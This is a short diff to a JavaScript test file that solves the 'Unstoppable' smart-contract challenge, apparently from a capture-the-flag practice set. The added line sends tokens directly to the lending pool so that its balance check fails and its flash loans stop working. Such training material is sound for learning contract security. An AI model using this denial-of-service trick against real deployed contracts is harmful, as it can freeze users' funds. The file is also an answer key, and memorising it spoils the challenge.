@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //[deployer, attacker, someUser] = await ethers.getSigners();
+
+        await this.token.transfer(this.pool.address, 10);
     });
 
     after(async function () {
